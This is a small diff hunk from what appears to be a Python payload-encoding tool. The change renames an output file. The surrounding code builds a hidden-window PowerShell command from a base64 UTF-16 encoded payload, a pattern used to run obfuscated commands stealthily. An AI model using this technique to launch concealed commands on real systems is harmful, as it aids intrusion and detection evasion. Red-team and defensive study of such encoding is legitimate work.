@@ -29,7 +29,7 @@ print(f"\n[*] Original payload: {payload}\n")
 cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
 now = datetime.strftime(datetime.now(), "%m%d_%H%M%S")
-command_file = f"ps_command_{now}.txt"
+command_file = f"ps_encoded_cmd_{now}.txt"
 with open(command_file, "w") as cf:
     cf.write(cmd)
     cf.flush()
